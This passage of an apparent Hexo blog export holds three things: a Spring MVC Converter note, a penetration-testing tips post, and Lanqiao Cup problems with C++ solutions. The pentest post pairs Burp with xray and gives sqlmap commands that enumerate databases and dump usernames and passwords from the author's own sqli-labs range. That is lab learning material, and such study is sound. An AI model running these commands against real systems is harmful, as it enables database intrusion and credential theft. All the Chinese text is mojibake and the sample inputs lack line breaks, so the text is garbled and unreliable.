¼å¼</p></li><li><p>å±æ€§ï¼špatternï¼šæŒ‡å®šæ—¥æœŸæ—¶é—´æ ¼å¼å­—ç¬¦ä¸²</p></li></ul><p>å·¥ä½œåŸç†ï¼š</p><ul><li>å…¶å†…éƒ¨ä¾èµ–Converteræ¥å£</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Converter</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">S</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Nullable</span>    <span class="token class-name">T</span> <span class="token function">convert</span><span class="token punctuation">(</span><span class="token class-name">S</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>è¯·æ±‚å‚æ•°å¹´é¾„æ•°æ®ï¼ˆStringâ†’Integerï¼‰</li><li>jsonæ•°æ®è½¬å¯¹è±¡ï¼ˆjson â†’ POJOï¼‰</li><li>æ—¥æœŸæ ¼å¼è½¬æ¢ï¼ˆString â†’ Dateï¼‰</li></ul><blockquote><p>ä¼ é€’æ—¥æœŸç±»å‹å‚æ•°å¿…é¡»åœ¨é…ç½®ç±»ä¸Šä½¿ç”¨@EnableWebMvcæ³¨è§£ã€‚å…¶åŠŸèƒ½ä¹‹ä¸€ï¼šæ ¹æ®ç±»å‹åŒ¹é…å¯¹åº”çš„ç±»å‹è½¬æ¢å™¨ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaEE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€å°tipsï¼ˆä¸€ï¼‰</title>
      <link href="/2022/04/03/shen-tou-xiao-tips-yi/"/>
      <url>/2022/04/03/shen-tou-xiao-tips-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="Burp-xray"><a href="#Burp-xray" class="headerlink" title="Burp+xray"></a>Burp+xray</h2><p>xrayæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œä¸»è¦ç‰¹æ€§æœ‰ï¼š</p><ul><li>æ£€æµ‹é€Ÿåº¦å¿«ã€‚å‘åŒ…é€Ÿåº¦å¿«; çªç ´æ€§æ£€æµ‹ç®—æ³•é«˜æ•ˆã€‚</li><li>æ”¯æŒèŒƒå›´å¹¿ã€‚å¤§è‡³OWASPåå¤§é€šç”¨çªç ´æ£€æµ‹ï¼Œå°è‡³å„ç§CMSæ¡†æ¶POCï¼Œå‡å¯ä»¥æ”¯æŒã€‚</li><li>ä»£ç è´¨é‡é«˜ã€‚ç¼–å†™ä»£ç çš„äººå‘˜ç´ è´¨é«˜ï¼Œé€šè¿‡ä»£ç å®¡æŸ¥ï¼Œå•å…ƒæµ‹è¯•ï¼Œé›†æˆæµ‹è¯•ç­‰å¤šå±‚éªŒè¯æ¥æé«˜ä»£ç å¯é æ€§ã€‚</li><li>é«˜çº§å¯å®šåˆ¶ã€‚é€šè¿‡é…ç½®æ–‡ä»¶æš´éœ²äº†å¼•æ“çš„å„ç§å‚æ•°ï¼Œé€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶å¯ä»¥æå¤§çš„å®¢åˆ¶åŒ–åŠŸèƒ½ã€‚</li><li>å®‰å…¨æ— å¨èƒã€‚xrayå®šä½ä¸ºä¸€ç§å®‰å…¨è¾…åŠ©è¯„ä¼°å·¥å…·ï¼Œè€Œä¸æ˜¯æ”»å‡»å·¥å…·ï¼Œå†…ç½®çš„æ‰€æœ‰æœ‰æ•ˆè½½è·å’Œpocè¿›è¡Œæ— å®³åŒ–æ£€æŸ¥ã€‚</li></ul><blockquote><p>xrayæœ€ä¸»è¦çš„å°±æ˜¯å’ŒBurpsuitè”åŠ¨</p></blockquote><h4 id="é¦–å…ˆç”Ÿæˆè¯ä¹¦"><a href="#é¦–å…ˆç”Ÿæˆè¯ä¹¦" class="headerlink" title="é¦–å…ˆç”Ÿæˆè¯ä¹¦"></a><strong>é¦–å…ˆç”Ÿæˆè¯ä¹¦</strong></h4><p>xrayæ‰€åœ¨ç›®å½•ä¸‹ï¼Œæ‰“å¼€cmdï¼Œè¾“å…¥</p><pre class="line-numbers language-none"><code class="language-none">.\xray_windows_amd64.exe genca<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨å½“å‰ç›®å½•ä¸‹ä¼šç”Ÿæˆæœ‰ä¸€ä¸ªè¯ä¹¦ï¼Œç„¶åå¯¼å…¥åˆ°Firefoxæµè§ˆå™¨ä¸­</p><p>æ‰“å¼€è®¾ç½®ï¼Œæœç´¢è¯ä¹¦</p><img src="image-20220404220556784.png" style="zoom: 80%;"><p>ç›´æ¥å¯¼å…¥</p><p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404220639192.png"></p><h4 id="å¼€å¯xrayç›‘å¬"><a href="#å¼€å¯xrayç›‘å¬" class="headerlink" title="å¼€å¯xrayç›‘å¬"></a>å¼€å¯xrayç›‘å¬</h4><p>cmdä¸‹è¾“å…¥</p><pre class="line-numbers language-none"><code class="language-none">.\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output proxy.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªè¡¨ç¤ºç›‘å¬127.0.0.1çš„7777ç«¯å£å¹¶å°†æ‰«æç»“æœç”Ÿæˆproxy.htmlæ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹</p><p>xrayå®šä¹‰äº†å¦‚ä¸‹å‡ ç§è¾“å‡ºæ–¹å¼ï¼š</p><ul><li>å±å¹•è¾“å‡ºï¼Œé»˜è®¤å¼€å¯</li><li>JSONæ–‡ä»¶è¾“å‡º</li><li>HTMLæŠ¥å‘Šè¾“å‡º</li><li>Webhookè¾“å‡º</li></ul><h4 id="Burpè®¾ç½®"><a href="#Burpè®¾ç½®" class="headerlink" title="Burpè®¾ç½®"></a>Burpè®¾ç½®</h4><p>æ‰“å¼€Burpsuitï¼Œç‚¹å‡»User options</p><p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404221053430.png"></p><p>æ·»åŠ ä¸Šæµä»£ç†æœåŠ¡ï¼ŒæŒ‰ç…§ä¸€ä¸‹é…ç½®</p><p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404221155485.png"></p><blockquote><p>Destination hostå¤„å¯ä»¥ä½¿ç”¨*åŒ¹é…å¤šä¸ªä»»æ„å­—ç¬¦ä¸²ï¼Œ?åŒ¹é…å•ä¸€ä»»æ„å­—ç¬¦ä¸²ï¼Œè€Œä¸Šæ¸¸ä»£ç†çš„åœ°å€åˆ™å¡«å†™ xray çš„ç›‘å¬åœ°å€ã€‚</p></blockquote><p>æŸ¥çœ‹xrayçš„cmdï¼Œå°±å¯ä»¥å¼€åˆ°æ‰«æç»“æœã€‚</p><p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404221453774.png"></p><p>è¿˜å¯ä»¥æŸ¥çœ‹proxy.htmlè·å–ç»“æœ</p><h2 id="sqlmapçš„ä½¿ç”¨"><a href="#sqlmapçš„ä½¿ç”¨" class="headerlink" title="sqlmapçš„ä½¿ç”¨"></a>sqlmapçš„ä½¿ç”¨</h2><p>sqlmap  è¿è¡Œåœ¨python2.7ç¯å¢ƒä¸‹</p><p>æµ‹è¯•æˆ‘è‡ªå·±æ­çš„sqli-labé¶åœº</p><ul><li>sqlmap -u ç½‘å€ â€“dbsï¼šçˆ†æ‰€æœ‰æ•°æ®åº“ä¿¡æ¯</li></ul><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="image-20220404224347361.png" style="zoom:80%;"><ul><li>sqlmap -u ç½‘å€ -D security â€“tables ï¼šæŸ¥çœ‹securityé‡Œæœ‰å¤šå°‘å¼ è¡¨</li></ul><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 -D security --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="image-20220404224330960.png" style="zoom:80%;"><ul><li>sqlmap -u ç½‘å€ -D security -T users â€“columnsï¼šæŸ¥çœ‹securityä¸­usersè¿™å¼ è¡¨æœ‰å¤šå°‘åˆ—</li></ul><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 -D security -T users --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/04/03/shen-tou-xiao-tips-yi/image-20220404224739334.png"></p><ul><li>sqlmap -u ç½‘å€ -D security -T users -C username,password â€“dump ï¼šå–å‡ºsecurityé‡Œçš„ç”¨æˆ·åå’Œå¯†ç ï¼Œdumpå–çš„æ„æ€</li></ul><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-1/?id=1 -D security -T users -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="image-20220404224856912.png" style="zoom: 67%;"><ul><li>æŠ¥é”™æ³¨å…¥ï¼šsqlmap -u ç½‘å€ â€“current-db â€“batch(å¿½ç•¥ä¸€äº›é”™è¯¯)  â€“threads 10 â€“technique E</li></ul><p>å‘½ä»¤è¾“å…¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http://82.157.179.125:8032/Less-5/?id=123 --current-db --batch --threads 10 --technique E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆåŠŸæŸ¥åˆ°</p><img src="image-20220404231723263.png" alt="image-20220404231723263" style="zoom:33%;"><ul><li><p>postæ³¨å…¥â€”â€”æŒ‡å®šè¡¨å•ï¼š*æ ‡è¯†åœ¨å“ªé‡Œï¼Œå“ªé‡Œè¿›è¡Œæ‰“å‡»    sqlmap - u ç½‘å€ï¼ˆä¸éœ€è¦ç›®æ ‡æ³¨å…¥ç‚¹ï¼‰ â€“data â€œuname = admin*&amp;passwd = adminâ€ â€“dbs</p></li><li><p>postæ³¨å…¥â€”â€”ä¸Burpsuiteè”åŠ¨ï¼ˆæ¯”è¾ƒå¸¸ç”¨ï¼‰ï¼šç”¨burpæŠ“åŒ…ï¼Œcopy to fileï¼Œå¯¼å‡ºä¸ºtxtæ–‡ä»¶ã€‚æ‰“å¼€æ–‡ä»¶ï¼Œåœ¨æ³¨å…¥ç‚¹æ‰“*ï¼Œcopyåˆ°kaliä¸Šã€‚</p><p>sqlmap -r â€œæ–‡ä»¶è·¯å¾„â€  â€“dbs </p><img src="image-20220404231049389.png" alt="image-20220404231049389" style="zoom: 25%;"><p>å‘½ä»¤è¾“å…¥ï¼š</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r "/root/test.txt" --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="image-20220404231204227.png" style="zoom: 50%;"></li><li><p>cookie æ³¨å…¥ sqlmap -u ç½‘å€ï¼ˆä¸è¦æ³¨å…¥ç‚¹ï¼‰ â€“cookie=â€ æŠ“åŒ…çš„cookieï¼ˆæ³¨å…¥æ‰“*ï¼‰â€å’Œpostæ³¨å…¥ä¸€æ ·</p></li><li><p>technique å¯¹åº”å››ä¸ªå‚æ•°ï¼šBETS</p></li></ul><blockquote><p>E = error      B = bilnd     T = time     S = standard</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> å·¥å…·ä½¿ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è“æ¡¥æ¯é€‰é¢˜ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/04/03/lan-qiao-bei-xuan-ti-yi/"/>
      <url>/2022/04/03/lan-qiao-bei-xuan-ti-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="è´Ÿè½½å‡è¡¡"><a href="#è´Ÿè½½å‡è¡¡" class="headerlink" title="è´Ÿè½½å‡è¡¡"></a>è´Ÿè½½å‡è¡¡</h2><p>æœ‰ $n$ å°è®¡ç®—æœºï¼Œç¬¬ $i$ å°è®¡ç®—æœºçš„è¿ç®—èƒ½åŠ›ä¸º $v_i$ã€‚</p><p>æœ‰ä¸€ç³»åˆ—çš„ä»»åŠ¡è¢«æŒ‡æ´¾åˆ°å„ä¸ªè®¡ç®—æœºä¸Šï¼Œç¬¬ $i$ ä¸ªä»»åŠ¡åœ¨ $a_i$ æ—¶åˆ»åˆ†é…ï¼ŒæŒ‡å®šè®¡ç®—æœºç¼–å·ä¸º $b_i$ï¼Œè€—æ—¶ä¸º $c_i$ ä¸”ç®—åŠ›æ¶ˆè€—ä¸º $d_i$ã€‚</p><p>å¦‚æœæ­¤ä»»åŠ¡æˆåŠŸåˆ†é…ï¼Œå°†ç«‹åˆ»å¼€å§‹è¿è¡Œï¼ŒæœŸé—´æŒç»­å ç”¨ $b_i$ å·è®¡ç®—æœº $d_i$ çš„ç®—åŠ›ï¼ŒæŒç»­ $c_i$ ç§’ã€‚</p><p>å¯¹äºæ¯æ¬¡ä»»åŠ¡åˆ†é…ï¼Œå¦‚æœè®¡ç®—æœºå‰©ä½™çš„è¿ç®—èƒ½åŠ›ä¸è¶³åˆ™è¾“å‡º $âˆ’1$ï¼Œå¹¶å–æ¶ˆè¿™æ¬¡åˆ†é…ï¼Œå¦åˆ™è¾“å‡ºåˆ†é…å®Œè¿™ä¸ªä»»åŠ¡åè¿™å°è®¡ç®—æœºçš„å‰©ä½™è¿ç®—èƒ½åŠ›ã€‚</p><h4 id="è¾“å…¥æ ¼å¼"><a href="#è¾“å…¥æ ¼å¼" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° $n, m$ï¼Œåˆ†åˆ«è¡¨ç¤ºè®¡ç®—æœºæ•°ç›®å’Œè¦åˆ†é…çš„ä»»åŠ¡æ•°ã€‚</p><p>ç¬¬äºŒè¡ŒåŒ…å« $n$ ä¸ªæ•´æ•° $v_1, v_2, Â· Â· Â· v_n$ï¼Œåˆ†åˆ«è¡¨ç¤ºæ¯ä¸ªè®¡ç®—æœºçš„è¿ç®—èƒ½åŠ›ã€‚</p><p>æ¥ä¸‹æ¥ $m$ è¡Œæ¯è¡Œ $4$ ä¸ªæ•´æ•° $a_i, b_i, c_i, d_i$ï¼Œæ„ä¹‰å¦‚ä¸Šæ‰€è¿°ã€‚æ•°æ®ä¿è¯ $a_i$ ä¸¥æ ¼é€’å¢ï¼Œå³ $a_i &lt; a_{i+1}$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼"><a href="#è¾“å‡ºæ ¼å¼" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡º $m$ è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ•°ï¼Œå¯¹åº”æ¯æ¬¡ä»»åŠ¡åˆ†é…çš„ç»“æœã€‚</p><h4 id="æ•°æ®èŒƒå›´"><a href="#æ•°æ®èŒƒå›´" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å¯¹äº $20%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$n, m â‰¤ 200$ã€‚<br>å¯¹äº $40%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$n, m â‰¤ 2000$ã€‚<br>å¯¹äºæ‰€æœ‰è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ n, m â‰¤ 200000ï¼Œ1 â‰¤ a_i, c_i, d_i, v_i â‰¤ 10^9ï¼Œ1 â‰¤ b_i â‰¤ n$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š"><a href="#è¾“å…¥æ ·ä¾‹ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2 65 51 1 5 32 2 2 63 1 2 34 1 6 15 1 3 36 1 3 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">2-1-11-10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š"><a href="#æ ·ä¾‹è§£é‡Š" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>æ—¶åˆ» $1$ï¼Œç¬¬ $1$ ä¸ªä»»åŠ¡è¢«åˆ†é…åˆ°ç¬¬ $1$ å°è®¡ç®—æœºï¼Œè€—æ—¶ä¸º $5$ï¼Œè¿™ä¸ªä»»åŠ¡æ—¶åˆ» $6$ ä¼šç»“æŸï¼Œå ç”¨è®¡ç®—æœº $1$ çš„ç®—åŠ› $3$ã€‚</p><p>æ—¶åˆ» $2$ï¼Œç¬¬ $2$ ä¸ªä»»åŠ¡éœ€è¦çš„ç®—åŠ›ä¸è¶³ï¼Œæ‰€ä»¥åˆ†é…å¤±è´¥äº†ã€‚</p><p>æ—¶åˆ» $3$ï¼Œç¬¬ $1$ ä¸ªè®¡ç®—æœºä»ç„¶æ­£åœ¨è®¡ç®—ç¬¬ $1$ ä¸ªä»»åŠ¡ï¼Œå‰©ä½™ç®—åŠ›ä¸è¶³ $3$ï¼Œæ‰€ä»¥å¤±è´¥ã€‚</p><p>æ—¶åˆ» $4$ï¼Œç¬¬ $1$ ä¸ªè®¡ç®—æœºä»ç„¶æ­£åœ¨è®¡ç®—ç¬¬ $1$ ä¸ªä»»åŠ¡ï¼Œä½†å‰©ä½™ç®—åŠ›è¶³å¤Ÿï¼Œåˆ†é…åå‰©ä½™ç®—åŠ› $1$ã€‚</p><p>æ—¶åˆ» $5$ï¼Œç¬¬ $1$ ä¸ªè®¡ç®—æœºä»ç„¶æ­£åœ¨è®¡ç®—ç¬¬ $1, 4$ ä¸ªä»»åŠ¡ï¼Œå‰©ä½™ç®—åŠ›ä¸è¶³ $4$ï¼Œå¤±è´¥ã€‚</p><p>æ—¶åˆ» $6$ï¼Œç¬¬ $1$ ä¸ªè®¡ç®—æœºä»ç„¶æ­£åœ¨è®¡ç®—ç¬¬ $4$ ä¸ªä»»åŠ¡ï¼Œå‰©ä½™ç®—åŠ›è¶³å¤Ÿï¼Œä¸”æ°å¥½ç”¨å®Œã€‚</p><h4 id="é¢˜è§£ï¼š"><a href="#é¢˜è§£ï¼š" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>æœ‰ä¼˜å…ˆé˜Ÿåˆ—è¿›è¡Œæ¨¡æ‹Ÿã€‚é˜Ÿåˆ—é‡Œé¢æ˜¯ä¸ªpairç±»å‹ï¼Œå­˜æ”¾ç€ç»“æŸæ—¶é—´å’Œéœ€æ±‚ç®—åŠ›</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;queue&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">2000010</span><span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">typedef</span> pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&gt;</span> p<span class="token punctuation">;</span>priority_queue<span class="token operator">&lt;</span>p<span class="token punctuation">,</span>vector<span class="token operator">&lt;</span>p<span class="token operator">&gt;&gt;</span> q<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>m<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>m<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> x<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">;</span>cin<span class="token operator">&gt;&gt;</span>x<span class="token operator">&gt;&gt;</span>b<span class="token operator">&gt;&gt;</span>c<span class="token operator">&gt;&gt;</span>d<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>q<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token operator">&lt;=</span>x<span class="token punctuation">)</span><span class="token punctuation">{</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">+=</span>q<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>second<span class="token punctuation">;</span>q<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">&lt;</span>d<span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span><span class="token string">"-1"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">{</span>            q<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span>x<span class="token operator">+</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åŠ å…¥ä»»åŠ¡</span>            a<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">-=</span> d<span class="token punctuation">;</span><span class="token comment">//æ›´æ–°ç®—åŠ›</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¾“å‡ºç®—åŠ›</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å®Œå…¨å¹³æ–¹æ•°"><a href="#å®Œå…¨å¹³æ–¹æ•°" class="headerlink" title="å®Œå…¨å¹³æ–¹æ•°"></a>å®Œå…¨å¹³æ–¹æ•°</h2><p>ä¸€ä¸ªæ•´æ•° $a$ æ˜¯ä¸€ä¸ªå®Œå…¨å¹³æ–¹æ•°ï¼Œæ˜¯æŒ‡å®ƒæ˜¯æŸä¸€ä¸ªæ•´æ•°çš„å¹³æ–¹ï¼Œå³å­˜åœ¨ä¸€ä¸ªæ•´æ•° $b$ï¼Œä½¿å¾— $a = b^2$ã€‚</p><p>ç»™å®šä¸€ä¸ªæ­£æ•´æ•° $n$ï¼Œè¯·æ‰¾åˆ°æœ€å°çš„æ­£æ•´æ•° $x$ï¼Œä½¿å¾—å®ƒä»¬çš„ä¹˜ç§¯æ˜¯ä¸€ä¸ªå®Œå…¨å¹³æ–¹æ•°ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥ä¸€è¡ŒåŒ…å«ä¸€ä¸ªæ­£æ•´æ•° $n$ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºæ‰¾åˆ°çš„æœ€å°çš„æ­£æ•´æ•° $x$ã€‚</p><h4 id="æ•°æ®èŒƒå›´-1"><a href="#æ•°æ®èŒƒå›´-1" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>å¯¹äº $30%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ n â‰¤ 1000$ï¼Œç­”æ¡ˆä¸è¶…è¿‡ $1000$ã€‚<br>å¯¹äº $60%$ çš„è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ n â‰¤ 10^8$ï¼Œç­”æ¡ˆä¸è¶…è¿‡ $10^8$ã€‚<br>å¯¹äºæ‰€æœ‰è¯„æµ‹ç”¨ä¾‹ï¼Œ$1 â‰¤ n â‰¤ 10^{12}$ï¼Œç­”æ¡ˆä¸è¶…è¿‡ $10^{12}$ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹1ï¼š"><a href="#è¾“å…¥æ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹1ï¼š"></a>è¾“å…¥æ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">12<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹1ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹1ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹1ï¼š"></a>è¾“å‡ºæ ·ä¾‹1ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å…¥æ ·ä¾‹2ï¼š"><a href="#è¾“å…¥æ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å…¥æ ·ä¾‹2ï¼š"></a>è¾“å…¥æ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹2ï¼š"><a href="#è¾“å‡ºæ ·ä¾‹2ï¼š" class="headerlink" title="è¾“å‡ºæ ·ä¾‹2ï¼š"></a>è¾“å‡ºæ ·ä¾‹2ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="é¢˜è§£ï¼š-1"><a href="#é¢˜è§£ï¼š-1" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>æ•°è®ºé—®é¢˜ï¼Œä¸€ä¸ªæ•°å¯ä»¥åˆ†æˆå¤šä¸ªç´ æ•°çš„ä¹˜ç§¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦è®©è¿™äº›ç´ æ•°éƒ½æ˜¯æˆå¶æ¬¡æ–¹å‘ˆç°å°±å¯ä»¥äº†ã€‚</p><p>å¯¹åŸæ•°è¿›è¡Œåˆ†è§£æˆå¯¹ä¸ªç´ æ•°ï¼Œç„¶åç­”æ¡ˆå°±æ˜¯é‚£äº›ä¸æˆå¶æ¬¡æ–¹ç´ æ•°çš„ä¹˜ç§¯ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">long</span> <span class="token keyword">long</span> LL<span class="token punctuation">;</span>LL n<span class="token punctuation">;</span>LL res <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token 